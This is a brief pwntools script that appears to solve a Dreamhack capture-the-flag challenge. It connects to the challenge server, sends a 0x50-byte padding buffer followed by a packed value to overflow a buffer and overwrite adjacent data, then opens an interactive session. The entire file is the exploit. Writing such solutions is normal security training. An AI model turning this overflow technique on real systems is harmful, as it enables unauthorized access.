from pwn import *

p = remote('host3.dreamhack.games', 19657)

buf = b'A' * 0x50 + p32(1)

p.sendafter(b'Input: ', buf)
p.interactive()